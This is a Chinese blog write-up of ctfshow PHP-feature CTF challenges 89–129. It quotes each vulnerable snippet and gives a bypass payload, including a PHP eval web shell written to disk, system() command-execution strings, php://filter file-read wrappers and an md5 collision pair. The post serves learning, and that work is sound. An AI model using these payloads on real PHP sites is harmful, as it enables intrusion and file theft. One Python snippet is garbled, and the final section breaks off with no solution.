---
title: ctfshow-重温php特性
date: 2022-1-4 00:47:30
author: Na0H
headimg: /img/atimg/php.png
tags:	
- ctfshow
categories:
- ctfshow
excerpt: ctfshow-重温php特性
description:  ctfshow-重温php特性

---

<!-- more -->

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1834078281&auto=0&height=66"></iframe>

```
# 上面播放器的代码如下（仅网易云外链链接，其他播放器请自行百度）
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1834078281&auto=0&height=66"></iframe>
# width(宽度) ; height(高度)
# type = 歌曲(1) | 歌单(2) | 电台(3)
# id = 歌曲ID号
# auto = 自动播放(1) | 手动播放(0)
```

## 89-intval

```php
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

对传入的num进行正则匹配，有数字则die；但是又要符合intval的判断

1. preg_match要求参数2为字符串，这里用数组就能绕过正则匹配

2. intval获取变量的整数值：[PHP: intval - Manual](https://www.php.net/manual/zh/function.intval.php)
   空数组返回0，非空数组返回1

   ```php
   echo intval(array());                 // 0
   echo intval(array('foo', 'bar'));     // 1
   ```

payload：

```
?num[]=1
```

1. 传入`?num[]=`的话不代表传入了一个空数组，而是传入了一个无键名和键值都为空的数组=-=；也就是说这个数组还是有东西的

2. 如果未指定键名，PHP 将自动使用之前用过的最大 int 键名加上 1 作为新的键名

   可以本地var_dump看：`array(1) { [0]=> string(0) "" }`



## 90-intval

```php
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

> `intval(value,base)`, base表示转化使用的进制
>
> **注意**:
>
> 如果 `base` 是 0，通过检测 `value` 的格式来决定使用的进制：
>
> - 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；
> - 如果字符串以 "0" 开始，使用 8 进制(octal)；
> - 将使用 10 进制 (decimal)。
>
> 变量在遇上数字或正负符号才做转换，遇到非数字或字符串结束时以(\0)结束转换
>
> ps：前提是进行弱类型比较


 payload：

```
二进制：0b1000101111100
八进制：010574
十六进制：0x117c
小数点：4476.110
科学计数法：4476e1
```

## 91-正则模式修饰符

```php
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```

正则模式修饰符：[PHP: 正则表达式模式中可用的模式修饰符 - Manual](https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php)
这里用到的是：

- i：大小写不敏感
- m：多行匹配；默认情况下`^`匹配字符串开头，`&`匹配字符串结尾或者最后的换行符；添加该模式修饰符后，`^`和`&`就会匹配目标字符串任意换行符前后

要通过第一个if，不通过第二个if；利用换行`%0a`即可

```
?cmd=%0aphp
```

## 92-intval

```php
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

90的话是用的强比较:
`if($num==="4476")`;`if(intval($num,0)===4476)`

 payload：

```
二进制：0b1000101111100
八进制：010574
十六进制：0x117c
小数点：4476.110
科学计数法：4476e1
```

## 93-intval

```php
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

过滤了字母，二进制、十六进制和科学技术法的方法用不了了

 payload：

```
八进制：010574
小数点：4476.110
```

## 94-intval

```php
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

过滤了字母，并且检测传入的num中首位是否为0

直接用八进制肯定不行，加个不影响判断的东西即可；小数点也还能用

```
八进制：%0a010574 、+010574 、%20010574
小数点：4476.110
```

## 95-intval

```php
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

把小数点过滤了

```
八进制：%0a010574 、+010574 、%20010574
```

## 96-./

```php
if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }
}
```

思路是利用`highlight_file`来读取，但是传入的u不能为flag.php

linux下./表示当前路径

```
?u=./flag.php
```

也可以伪协议读：

```
?u=php://filter/read=convert.base64-encode/resource=flag.php
```

## 97-md5

```php
if (isset($_POST['a']) and isset($_POST['b'])) {
	if ($_POST['a'] != $_POST['b'])
        if (md5($_POST['a']) === md5($_POST['b']))
            echo $flag;
        else
            print 'Wrong.';
}
```

经典的md5强弱比较

弱比较绕过：

```
一些md5编码后得到0exxx（此处xxx为十进制字符）的字符串
原字符串					md5值
QNKCDZO			0e830400451993494058024219903391
240610708		0e462097431906509019562988736854
aabg7XSs		0e087386482136013740957780965295
aabC9RqS		0e041022518165728065344349536299
s878926199a		0e545993274517709034328855841020
s155964671a		0e342768416822451524974117254469
s214587387a		0e848240448830537924465865611904
s214587387a		0e848240448830537924465865611904
s878926199a		0e545993274517709034328855841020
s1091221200a	0e940624217856561557816327384675
s1885207154a	0e509367213418206700842008763514
qebi7zl0		0e649420541288950724577306786996
qebaur5g		0e352312259284787676841028696030
qe20k7jl		0e416004725936696827118806457976
qe9vwdjf		0e288029216666843876260611249898
```

```python
# 碰到的某道题 要求变量$a==md5($a)
# 0e215962017
import hashlibfor 
i in range(0,10**41):	
    i='0e'+str(i)	
    md5=hashlib.md5(i.encode()).hexdigest()	
    if md5[:2]=='0e' and md5[2:].isdigit():		
        print('md5:{} '.format(i))		
        break
```

```python
# 生成md5值为0exxx，还有一些套娃关卡的第一关也是要求验证码，改一下就能用了
import hashlib
l = 'qwertyuiopasdfghjklzxcvbnm1234567890'
for i in l:
    for j in l:
        for k in l:    
            for m in l:        
                for n in l:            
                    for o in l:                
                        for p in l:                    
                            for q in l:                        
                                f = i + j + k + m + n + o + p + q                        
                                md5 = hashlib.md5(f.encode(encoding='UTF-8')).hexdigest()                        
                                if md5[:2] == '0e' and str.isdigit(md5[2:]):                            
                                    print(f)                            
                                    print(md5)
```

强比较绕过：

1. 数组绕过，md5无法处理数组，会返回NULL；
   即md5(NULL)=md5(NULL)

   ```
   a[]=1&b[]=2
   ```

   

2. ```php
   (string)$_POST['a1']!==(string)$_POST['a2']&&md5($_POST['a1'])===md5($_POST['a2'])}
   # 最后转换为字符串比较，因此使用数组就不可行了
   (md5(implode('',$_GET['username']))===md5(implode('',$_GET['password']))
   # implode()会先把数组元素拼接成字符串再进行md5加密，使用数组就不可行了
   # 不过因为implode的要求参数为数组，传入非数组则会警告并返回NULL，所以碰到implode的话直接传字符串也能过 
   ```

   使用两组MD5值相同的不同字符串，这里可以用脚本跑，
   下面是url编码过后的值：

   ```
   # 1
   a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
   
   # 2
   a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
   ```

## 98-三元运算

```php
include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
```

三元运算符`(exp1) ? (exp2) : (exp3)`，如果`exp1`为真则执行`exp2`，否则执行`exp3`

那么：

> `$_GET?$_GET=&$_POST:'flag';`
> 只要存在get传入的参数，将get方法改为post方法(利用`&`引用)；
>
> `$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';`
> 只要get传入的flag=flag，就使得get方法的参数=$_COOKIE传入的参数
>
> `$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';`
>
> 只要get传入的flag=flag，就使得get方法的参数=$_SERVER传入的参数
>
> 重点在于：`highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);`
> 只要我们`$_GET['HTTP_FLAG']=='flag'`为真，就会highlight_file($flag)

那么只要随便get一个参数a=1触发`$_GET=&$_POST`,然后POST传HTTP_FLAG=flag即可

## 99-in_array

```php
$allow = array();
for ($i=36; $i < 0x36d; $i++) { # 36~877
    array_push($allow, rand(1,$i));	# 给数组插入一个最小为1，最大为$i的随机数
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}
```

> ```php
> in_array(mixed $needle, array $haystack, bool $strict = false): bool
> ```
>
> 如果没设置strict，就会使用宽松比较

再看判断条件就是：传值n存在于数组$allow中，就会将content写到n里

> 1.当字符串中 以 `数字开头 +字符串+数字或字符(字符串)+…` 的格式与数字进行 == 判断时，
>
> 会取第一次出现字符(字符串)前的数字作为转换值。
>
> 2.当字符串中 以 `字符(字符串)开头 +数字+数字或字符(字符串)+…` 的格式与数字进行 == 判断时，
>
> 不能转换为数字，被强制转换为0

那么令n=1.php，而数组中都是数字，就会取1放入in_array进行匹配

尝试写马
payload：

```
GET:
?n=1.php
POST:
content=<?php eval($_POST[1]);?>
```

## 100-ReflectionClass

```php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
}
```

提示flag在类ctfshow里，并且已经new给变量$ctfshow了
要求v1，v2，v3是数字，并且对分号进行过滤

这里学习了下yu师傅的博客：
[CTFSHOW PHP特性篇（上篇 89-110）羽的博客-CSDN博客_ctfshow php特性](https://blog.csdn.net/miuzzx/article/details/109168454)

考点1：`and`和`&&`的区别

`$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);`

```php
<?php
$a=true and false and false;
var_dump($a);  返回true

$a=true && false && false;
var_dump($a);  返回false
```



解法1：过滤比较简单，构造闭合rce

```
?v1=1&v2=?><?= system('tac ctfshow.php')?>&v3=;
```

解法2：提示flag在类ctfshow里，并且已经new给变量$ctfshow了
可以直接输出$ctfshow的值：

```
?v1=1&v2=var_dump($ctfshow)?>&v3=;
```

解法3：反射类`ReflectionClass`的使用 [PHP: ReflectionClass - Manual](https://www.php.net/manual/zh/class.reflectionclass.php)

```
?v1=1&v2=echo new ReflectionClass&v3=;
```



## 101-ReflectionClass

> hint：修补100题非预期,替换0x2d为-,最后一位需要爆破16次，题目给的flag少一位

```php
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}
```

添加了正则规则，没法rce了

反射类`ReflectionClass`的使用 [PHP: ReflectionClass - Manual](https://www.php.net/manual/zh/class.reflectionclass.php)

```
?v1=1&v2=echo new ReflectionClass&v3=;
```



## 102、103-hex2bin

```php
# 102
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}

# 103
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
}
```

v1作为回调函数，s=v2的第三个字符后的字符串(012)：也就是执行函数v1(s)
然后将$str写入v3里

```php
GET：
?v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-
decode/resource=2.php

POST：
v1=hex2bin
#访问1.php后查看源代码获得flag
```

ps：代码base64编码后再转为十六进制为全数字

故：

```
$a='<?=`cat *`;';
$b=base64_encode($a); // PD89YGNhdCAqYDs=
$c=bin2hex($b);     
// 等号在base64中只是起到填充的作用，不影响具体的数据内容，
// 输出5044383959474e6864434171594473
// 带e的话会被认为是科学计数法，可以通过is_numeric检测

// 因为substr的存在，需要在其前面加上两个数字，这随便加了2个1
// 即v2=115044383959474e6864434171594473
```

## 104、106-sha1

```php
# 104
if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}

# 106
if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){
        echo $flag;
    }
}
```

104直接给v1和v2赋同样的值就行

106：

> `substr()`、`sha1()`、`base64_decode()`只能处理传入的字符串数据
> 当传入数组后会报出Warning错误，但仍会正常运行并返回值NULL，就会使得两边相等

```
$a=[];var_dump(substr($a, 123));		//NULL
var_dump(sha1($a));						//NULL
# sha1后为0e数字的值：aaroZmOk aaO8zKZF aaK1STfY
# aaK1STfY	0e76658526655756207688271159624026011393
# aaO8zKZF	0e89257456677279068558073954252716165668
var_dump(substr($a, 123) === sha1($cc));	//bool(true)
```

1是数组绕

```
GET:
?v2[]=1
POST:
v1[]=2
```

2是传入sha1()后得到0e开头其余数字的字符串

```
GET:
?v2=aaK1STfY
POST:
v1=aaO8zKZF
```

## 105-可变变量覆盖

```php
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);
```

$$可变变量覆盖
三个变量：$erroe(不可get赋给key)、$flag(不可post赋给value)、$suces
两种思路：

die($erroe)

把flag的值借助中间变量suces赋给error就行
`$error=$suces=$flag`

```
GET:
suces=flag
POST:
error=suces
```

die($suces)

把flag的值赋给suces，`$suces=$flag`
post传入`flag=`,那么`$_POST['flag']=$flag=NULL`

```
GET:
suces=flag
POST:
flag=
```

## 107-parse_str

```php
if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }
}
```

> [PHP: parse_str - Manual](https://www.php.net/manual/zh/function.parse-str.php)
>
> parse_str — 将字符串解析成多个变量
>
> ```php
> parse_str(string $string, array &$result): void
> ```
>
> 如果设置了第二个变量 `result`， 变量将会以数组元素的形式存入到这个数组，作为替代。(8.0中result是必须项)

比如传入：
v1=a=111&b=222
那么就得到：v2['a']=111,v2['b']=222

那么只要满足：`if($v2['flag']==md5($v3))`即可

```
GET:
?v3=1
POST:
v1=flag=c4ca4238a0b923820dcc509a6f75849b
```

## 108-ereg_NULL截断

```php
if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}
```

> ereg对c进行正则匹配，没有字母则die
> `ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配`
>
> strrev会把字符串反转
>
> intval对反转后的字符串进行转换

```
?c=a%00778
```

## 109-php原生类

```php
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }
}
```

这里加了`error_reporting(0);`
所以看不到报错，在本地试试就会看到报错了
随便只要能成功new一个类出来，就可以构造闭合rce了
这里因为要echo出来，用带有`_toString`的php原生类就可以了：
Error、Exception

```
?v1=Error();system('tac f*');?>&v2=a
?v1=Exception();system('tac f*');?>&v2=a
```

> hint的做法：
> // 利用php异常处理类 http://c.biancheng.net/view/6253.html
>
> ```
> ?v1=Exception&v2=system('cat fl36dg.txt')
> ?v1=Reflectionclass&v2=system('cat fl36dg.txt')
> ```

## 110-FilesystemIterator

```php
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");

}
```

添加了过滤，修复了109构造闭合rce的非预期

利用 FilesystemIterator 获取指定目录下的所有文件
[PHP: FilesystemIterator - Manual](https://www.php.net/manual/zh/class.filesystemiterator.php)
getcwd获取当前路径

```
?v1=FilesystemIterator&v2=getcwd
```

## 111-全局变量GLOBALS

```php
function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}

if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}
```

> 利用全局变量GLOBALS
> $GLOBALS — 引用全局作用域中可用的全部变量 
> 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。

把$GLOBALS赋值给v2，然后v2再赋值给v1,即可将全部变量输出

```
?v1=ctfshow&v2=GLOBALS
```

## 112-is_file

```php
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

> is_file判断所给文件名是否为一个正常的文件
> filename为文件路径
>
> ```php
> is_file ( string $filename ) : bool
> ```

要不被is_file检测出来，然后highlight_file可以识别
那么就可用伪协议：

```
php://filter/resource=flag.php

php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php

php://filter/read=convert.quoted-printable-encode/resource=flag.php

compress.zlib://flag.php
```

## 113-is_file-目录溢出

```php
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

过滤了filter，不过`compress.zlib://flag.php`依然可用

[WMCTF2020 PHP source analysis (frankli.site)](https://blog.frankli.site/2020/08/05/Security/php-src/WMCTF2020-PHP-source-analysis/)



预期解是：

> **在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容.**
>
> 那么超过20次的软连接后就会造成目录溢出，和is_file()能处理的长度有关
> 从而绕过is_file，而highlight_file可以识别

```
/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

## 114-同112

```php
function filter($file){
   		  			      if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 
```

压缩包和root也都被过滤了，不过filter放出来了

```
php://filter/resource=flag.php
```

## 115-综合绕过

```php
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
}
```

看关键判断

`if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36')`

1、在数字前加不可见字符可以通过is_numeric()的判断，且`强比较`不为36

2、trim函数会把字符串前后空白字符去除(`空格%20`、`制表tab%09`、`换行%0a`、`回车%0d`、`垂直制表%0b`、`空字符%00`)

不过还有个`换页键%0c`可用

3、filter函数把$num里的`0x`、`0`、`.`、`e`、`+`都替换为1

可能疑惑的点是`$num!=='36'`和`$num=='36'`,这里就是强弱比较的差别

强比较比较类型和值；弱比较只比较值，如果类型不同，则转换类型再比较

`$num!=='36'`中，二者都是字符串类型，但值不同，因此不等
`$num=='36'`中，涉及数字的比较，会转换为数字类型再比较，从而相等

```
?num=%0c36
```

## 123、125、126-argv

```php
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}

# 125
if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16)
```

第一个是利用了：

php的变量名会默认把遇到的第一个`.`转换成`下划线_`

但如果出现了`[`，那么这个`[`转变为下划线后，后面的点并不会转化，可能是底层源码的问题
`CTF[SHOW.COM=>CTF_SHOW.COM`

然后就可以利用`eval("$c".";");`来rce；不过这个是非预期

```
POST:
CTF_SHOW=&CTF[SHOW.COM=&fun=echo $flag

# 125把flag过滤掉了，但还有别的办法
GET:
?1=flag.php
POST:
CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[1])
```

还有第二个考点：`$_SERVER['argv']`

> 摘自yu师傅的博客[CTFSHOW PHP特性篇（中篇 111-131）_羽的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/109181768?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.no_search_link&spm=1001.2101.3001.4242.1&utm_relevant_index=3)
> 1、cli模式（命令行）下
>
> 	第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数
>
> 2、web网页模式下
>
> 	在web页模式下必须在php.ini开启register_argc_argv配置项
> 												
> 	设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果
> 												
> 	这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]
> 												
> 	$argv,$argc在web模式下不适用

> 官方文档：[PHP: $_SERVER - Manual](https://www.php.net/manual/zh/reserved.variables.server)
> [argv](https://www.php.net/manual/zh/reserved.variables.argv.php)：传递给该脚本的参数的数组。
>
> > **注意**: 第一个参数总是当前脚本的文件名，因此 $argv[0] 就是脚本文件名。
> > **注意**: 这个变量仅在 [register_argc_argv](https://www.php.net/manual/zh/ini.core.php#ini.register-argc-argv) 打开时可用。
>
> - 当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。
>
> - 当通过 GET 方式调用时，该变量包含query string。
>
>   > 'QUERY_STRING'
>   > 查询字符串，如果有的话，通过它进行页面访问

我们是用GET方式调用，那么就有
`$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]`
（简单来说就是`$_SERVER[‘argv’][0]`等于url后的query部分）

那么就可以利用`eval("$c".";");`把`flag_give_me`赋给`$fl0g`

```
GET:
?$fl0g=flag_give_me;
POST:
CTF_SHOW=&CTF[SHOW.COM=&fun=eval($a[0])
```

这是yu师傅的做法

> yu师傅博客也提到了，出题人的预期解是：
>
> ```
> GET:
> ?a=1+fl0g=flag_give_me
> POST:
> CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
> ```
>
> 原理如下：
>
> > CLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去 继续判断query string是否为空， 如果不为空把通过+符号分割的字符串转换成php内部的zend_string， 然后再把这个zend_string复制到 arr 数组中去。
>
> 这样一来就可以通过`+`把argv分割为多个部分



## 127

```php
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];

//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}

if($ctf_show==='ilove36d'){
    echo $flag;
}
```

就是要求`$ctf_show==='ilove36d'`，不过waf里把_过滤掉了
学yu师傅跑一下0-128（不懂php的curl，还是python了）

```php
import requests
from urllib.parse import quote,unquote
url = "http://127.0.0.1/mytest/test1.php"
for i in range(0,129):
    r = requests.get(url,params="ctf"+chr(i)+"show")
    if r.text:
        if chr(i) != quote(chr(i)):
            print(chr(i)+" "+quote(chr(i)))
        else:
            print(chr(i))
```

```php
<?php
if (isset($_GET['ctf_show'])) {
    echo "yes";
}
```

得到：

```
  %20
+ %2B
.
[ %5B
_
```

其中 `_`、`.`、`[`和`+`被过滤掉了，拿咱们可以用空格

```
?ctf%20show=ilove36d
```

## 128-gettext扩展-_()

```php
$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}

function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
}
```

> 知识点：
>
> - [PHP: Gettext - Manual](https://www.php.net/manual/zh/book.gettext.php)
>   [关于php中gettext的用法？ - toxic - 博客园](https://www.cnblogs.com/lost-1987/articles/3309693.html)
>
>   在开启gettext拓展后，`_()`等效于gettext()，是gettext()的拓展函数；开启text扩展，需要php扩展目录下有php_gettext.dll
>   （简单概括一下大概就是一个字符串处理的函数或者说功能,用于进行字符替换等等；如果是未定义的字符，会直接返回原字符）
>
> - `get_defined_vars()函数`
>   get_defined_vars — 返回由所有已定义变量所组成的数组

那么`call_user_func(call_user_func('_','get_defined_vars'))`就等效于`call_user_func('get_defined_vars')`
然后再把get_defined_vars返回的数组var_dump出来

check函数把字母数字都过滤了，不过这里只对f1进行正则匹配
那就：

```
?f1=_&f2=get_defined_vars
```

## 129-目录穿越

```php
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```

